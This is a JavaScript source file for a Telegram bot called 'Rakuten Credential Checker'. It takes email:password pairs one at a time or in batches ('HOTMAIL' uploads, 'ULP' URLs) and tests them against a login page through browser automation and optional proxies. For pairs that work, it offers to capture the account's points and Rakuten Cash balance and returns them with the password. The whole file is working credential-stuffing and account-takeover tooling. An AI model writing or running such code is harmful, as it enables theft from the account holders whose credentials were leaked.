const { Telegraf, Markup } = require('telegraf');
const { checkCredentials } = require('./puppeteerChecker');
const { closeBrowserSession } = require('./automation/browserManager');
const { captureAccountData } = require('./automation/dataCapture');
const { registerBatchHandlers } = require('./telegram/batchHandlers');
const fs = require('fs').promises;

// Track sessions kept alive after VALID outcomes for optional data capture.
const pendingSessions = new Map();
const pendingTimeouts = new Map();
const pendingMeta = new Map();

/**
 * Validates and parses the credential string format "user:pass".
 * @param {string} credentialString - Raw credential string
 * @returns {Object|null} { username, password } or null if invalid
 */
function parseCredentials(credentialString) {
  if (!credentialString || typeof credentialString !== 'string') {
    return null;
  }

  const parts = credentialString.split(':');
  if (parts.length !== 2 || !parts[0].trim() || !parts[1].trim()) {
    return null;
  }

  return {
    username: parts[0].trim(),
    password: parts[1].trim(),
  };
}

/**
 * Validates email format.
 * @param {string} email - Email to validate
 * @returns {boolean} True if valid email format
 */
function isValidEmail(email) {
  if (!email || typeof email !== 'string') {
    return false;
  }

  const trimmed = email.trim();
  if (!trimmed || trimmed.length > 254) {
    return false;
  }

  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return pattern.test(trimmed);
}

/**
 * Basic input guard to keep Telegram commands tidy and safe.
 * @param {string} raw - Raw credential string
 * @returns {{valid: boolean, error?: string}}
 */
function guardInput(raw) {
  if (!raw || typeof raw !== 'string') {
    return { valid: false, error: 'Provide credentials in the form `.chk email:password`.' };
  }

  const input = raw.trim();
  if (!input) {
    return { valid: false, error: 'Provide credentials in the form `.chk email:password`.' };
  }

  if (input.length > 200) {
    return { valid: false, error: 'Input too long (max 200 characters).' };
  }

  if (input.includes('\n')) {
    return { valid: false, error: 'Use a single-line `email:password` pair.' };
  }

  const parts = input.split(':');
  if (parts.length !== 2) {
    return { valid: false, error: 'Use a single colon to separate email and password.' };
  }

  const [user, pass] = parts.map((p) => p.trim());
  if (!user || !pass) {
    return { valid: false, error: 'Both email and password are required.' };
  }

  if (!isValidEmail(user)) {
    return { valid: false, error: 'Email format looks invalid.' };
  }

  return { valid: true };
}

/**
 * Formats a result object into a user-friendly Telegram message with markdown.
 * @param {Object} result - Result from checkCredentials
 * @param {string} result.status - Status code
 * @param {string} result.message - Status message
 * @param {string} [result.screenshot] - Optional screenshot path
 * @param {string} [username] - Username being checked (masked)
 * @param {number} [durationMs] - Duration in milliseconds
 * @returns {string} Formatted message for Telegram
 */
function escapeV2(text) {
  if (!text) return '';
  return text.replace(/([_\*\[\]\(\)~`>#+\-=|{}.!])/g, '\\$1');
}

function codeV2(text) {
  return '`' + escapeV2(text) + '`';
}

function formatBytes(bytes) {
  if (!bytes || Number.isNaN(bytes)) return 'unknown';
  const mb = bytes / (1024 * 1024);
  return `${mb.toFixed(2)} MB`;
}

function formatDurationMs(ms) {
  const seconds = ms / 1000;
  if (seconds < 60) return `${seconds.toFixed(1)}s`;
  const minutes = Math.floor(seconds / 60);
  const rem = (seconds % 60).toFixed(1);
  return `${minutes}m ${rem}s`;
}

function boldV2(text) {
  return '*' + escapeV2(text) + '*';
}

function formatResultMessage(result, username = null, durationMs = null) {
  const statusEmoji = { VALID: '✅', INVALID: '❌', BLOCKED: '🔒', ERROR: '⚠️' };
  const statusLabel = {
    VALID: 'VALID CREDENTIALS',
    INVALID: 'INVALID CREDENTIALS',
    BLOCKED: 'ACCOUNT BLOCKED',
    ERROR: 'ERROR OCCURRED',
  };

  const emoji = statusEmoji[result.status] || '❓';
  const status = boldV2(statusLabel[result.status] || result.status || 'STATUS');

  const parts = [];
  parts.push(`${emoji} ${status}`);

  if (username) {
    const maskedUser = username.length > 3
      ? `${username.substring(0, 3)}***${username.substring(username.length - 2)}`
      : '***';
    parts.push(`${boldV2('👤 Account')}: ${codeV2(maskedUser)}`);
  }

  if (durationMs != null) {
    const seconds = durationMs / 1000;
    const pretty = seconds >= 10 ? seconds.toFixed(1) : seconds.toFixed(2);
    parts.push(`${boldV2('🕒 Time')}: ${codeV2(`${pretty}s`)}`);
  }

  parts.push(`${boldV2('📝 Result')}: ${escapeV2(result.message || '')}`);

  if (result.url) {
    const shortUrl = result.url.length > 60 ? `${result.url.substring(0, 60)}...` : result.url;
    parts.push(`${boldV2('🔗 Final URL')}: ${codeV2(shortUrl)}`);
  }

  if (result.screenshot) {
    parts.push(boldV2('📸 Screenshot attached'));
  }

  return parts.join('\n');
}

/**
 * Initializes and sets up the Telegram handler.
 * @param {string} botToken - Telegram bot token
 * @param {Object} [options] - Optional configuration
 * @returns {Telegraf} Configured bot instance
 */
function initializeTelegramHandler(botToken, options = {}) {
  const bot = new Telegraf(botToken);

  // Handle /start command
  bot.start(async (ctx) => {
    await ctx.replyWithMarkdown(
      '🎌 *RAKUTEN CREDENTIAL CHECKER*\n\n' +
      '✨ Fast, secure, and automated validation\n\n' +
      '📖 *HOW TO USE:*\n' +
      '`.chk email:password`\n\n' +
      '💡 *EXAMPLE:*\n' +
      '`.chk user@example.com:mypass123`\n\n' +
      '🔒 *FEATURES:*\n' +
      '• Live status updates\n' +
      '• Screenshot evidence\n' +
      '• Masked credentials\n' +
      '• Inline action buttons\n\n' +
      '⚡ Ready to start!',
      Markup.inlineKeyboard([
        [Markup.button.callback('📚 Guide', 'guide'), Markup.button.callback('❓ Help', 'help')],
      ])
    );
  });

  // Handle /help command
  bot.command('help', async (ctx) => {
    await ctx.replyWithMarkdown(
      '❓ *HELP & SUPPORT*\n\n' +
      '*Format:* `.chk email:password`\n\n' +
      '*Status Indicators:*\n' +
      '✅ VALID - Credentials work\n' +
      '❌ INVALID - Wrong credentials\n' +
      '🔒 BLOCKED - Account locked\n' +
      '⚠️ ERROR - Technical issue\n\n' +
      '*Notes:*\n' +
      '• Max 200 characters\n' +
      '• Use colon to separate email:password\n' +
      '• Results are private to your chat'
    );
  });

  // Register batch handlers (HOTMAIL uploads and ULP URLs)
  registerBatchHandlers(
    bot,
    { ...options, checkCredentials },
    { escapeV2, formatBytes, formatDurationMs }
  );

  // Handle .chk command
  bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const credentialString = ctx.match[1].trim();
    const startedAt = Date.now();

    // Guard input
    const guard = guardInput(credentialString);
    if (!guard.valid) {
      await ctx.replyWithMarkdown(`❌ ${guard.error}`);
      return;
    }

    // Parse credentials
    const creds = parseCredentials(credentialString);
    if (!creds) {
      await ctx.replyWithMarkdown(
        '❌ Failed to parse credentials.\n\nFormat: `.chk username:password`'
      );
      return;
    }

    // Send processing message (will be edited later)
    const statusMsg = await ctx.replyWithMarkdown('⏳ Checking credentials...');

    const updateStatus = async (text) => {
      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        console.warn('Status edit failed:', err.message);
      }
    };

    try {
      // Keep creds in state for follow-up capture summary (masked via spoiler later).
      ctx.state.lastUsername = creds.username;
      ctx.state.lastPassword = creds.password;

      // Check credentials
      const result = await checkCredentials(
        creds.username,
        creds.password,
        {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          screenshotOn: options.screenshotOn || false,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
          headless: options.headless,
          deferCloseOnValid: true, // keep session open for optional capture flow
          onProgress: async (phase) => {
            const phaseText = {
              launch: '⏳ Launching browser...',
              navigate: '🌐 Navigating to login page...',
              email: '✉️ Submitting email...',
              password: '🔑 Submitting password...',
              analyze: '🔍 Analyzing result...',
            };
            const text = phaseText[phase] || '⏳ Working...';
            await updateStatus(escapeV2(text));
          },
        }
      );

      // Format result message with masked username
      const durationMs = Date.now() - startedAt;
      const resultMessage = formatResultMessage(result, creds.username, durationMs);
      
      // Edit message with final result
      await updateStatus(resultMessage);

      // Always remove any screenshot file quietly
      if (result.screenshot) {
        await fs.unlink(result.screenshot).catch(() => {});
      }

      // Offer follow-up data capture only for valid credentials
      if (result.status === 'VALID') {
        const capturePrompt = await ctx.reply(
          '🔍 Proceed to capture data?',
          {
            parse_mode: 'Markdown',
            reply_to_message_id: statusMsg.message_id,
            ...Markup.inlineKeyboard([
              [
                Markup.button.callback('▶️ Yes, capture data', 'capture_data'),
                Markup.button.callback('⛔ No, skip', 'capture_decline'),
              ],
            ]),
          }
        );

        const sessionKey = `${chatId}:${capturePrompt.message_id}`;
        if (result.session) {
          pendingSessions.set(sessionKey, result.session);
          pendingMeta.set(sessionKey, {
            username: creds.username,
            password: creds.password,
          });
        }

        const captureExpiryMs = 60000; // expire prompt after 60s to avoid stale actions
        const timerId = setTimeout(async () => {
          try {
            await ctx.telegram.editMessageText(
              chatId,
              capturePrompt.message_id,
              undefined,
              '⌛ Capture session expired. Send `.chk email:password` again to restart.',
              { parse_mode: 'Markdown' }
            );
            const session = pendingSessions.get(sessionKey);
            if (session) {
              await closeBrowserSession(session).catch(() => {});
              pendingSessions.delete(sessionKey);
            }
            pendingMeta.delete(sessionKey);
            pendingTimeouts.delete(sessionKey);
          } catch (err) {
            // Ignore if already handled or edited
          }
        }, captureExpiryMs);
        pendingTimeouts.set(sessionKey, timerId);
      }
    } catch (err) {
      console.error('Credential check error:', err.message);
      
      // Edit status message to show error
      try {
        await ctx.telegram.editMessageText(
          chatId,
          statusMsg.message_id,
          null,
          `⚠️ *ERROR OCCURRED*\n\n❌ ${escapeV2(err.message)}\n\n_Try again or contact support_`,
          { parse_mode: 'MarkdownV2' }
        );
      } catch (editErr) {
        await ctx.reply(
          `⚠️ *ERROR OCCURRED*\n\n❌ ${escapeV2(err.message)}\n\n_Try again or contact support_`,
          { parse_mode: 'MarkdownV2' }
        );
      }
    }
  });

  // Handle inline button callbacks
  bot.action('capture_data', async (ctx) => {
    await ctx.answerCbQuery('⏳ Data capture flow will start soon.');
    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
    const timerId = pendingTimeouts.get(key);
    if (timerId) {
      clearTimeout(timerId);
      pendingTimeouts.delete(key);
    }
    const session = pendingSessions.get(key);
    if (!session) {
      await ctx.replyWithMarkdown(
        '⚠️ Session expired. Send `.chk email:password` to start again.',
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
      return;
    }
    const meta = pendingMeta.get(key) || {};

    try {
      const capture = await captureAccountData(session, { timeoutMs: options.timeoutMs || 60000 });
      const username = meta.username || 'unknown';
      const password = meta.password || 'hidden';
      const message =
        `${escapeV2('🗂️ Capture Summary')}` +
        `\n• *Points:* ${escapeV2(capture.points || 'n/a')}` +
        `\n• *Rakuten Cash:* ${escapeV2(capture.cash || 'n/a')}` +
        `\n• Username: ||\`${escapeV2(username)}\`||` +
        `\n• Password: ||\`${escapeV2(password)}\`||`;

      await ctx.reply(message, {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.update.callback_query.message.message_id,
      });
    } catch (err) {
      console.error('Capture failed:', err.message);
      await ctx.replyWithMarkdown(
        `⚠️ Capture failed: ${escapeV2(err.message)}`,
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
    } finally {
      await closeBrowserSession(session).catch(() => {});
      pendingSessions.delete(key);
      pendingMeta.delete(key);
    }
  });

  bot.action('capture_decline', async (ctx) => {
    await ctx.answerCbQuery('✅ Capture skipped.');
    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
    const timerId = pendingTimeouts.get(key);
    if (timerId) {
      clearTimeout(timerId);
      pendingTimeouts.delete(key);
    }
    const session = pendingSessions.get(key);
    if (session) {
      await closeBrowserSession(session).catch(() => {});
      pendingSessions.delete(key);
    }
    pendingMeta.delete(key);
    try {
      await ctx.editMessageText('❎ Data capture skipped. Send `.chk` again if you want to restart.', {
        parse_mode: 'Markdown',
      });
    } catch (err) {
      await ctx.replyWithMarkdown(
        '❎ Data capture skipped.',
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
    }
  });

  bot.action('guide', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '📚 *QUICK GUIDE*\n\n' +
      '*1.* Type `.chk` followed by your credentials\n' +
      '*2.* Format: `email:password` (no spaces)\n' +
      '*3.* Wait for the check to complete\n' +
      '*4.* Review the result with evidence\n\n' +
      '✨ Bot edits the message in real-time!'
    );
  });

  bot.action('help', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '❓ *NEED HELP?*\n\n' +
      'Send: `/help` for detailed instructions\n\n' +
      'Or just try:\n' +
      '`.chk test@example.com:password123`'
    );
  });

  // Launch bot
  bot.launch();
  
  console.log('✓ Bot launched successfully!');

  return bot;
}

module.exports = {
  initializeTelegramHandler,
  parseCredentials,
  guardInput,
  formatResultMessage,
  isValidEmail,
};
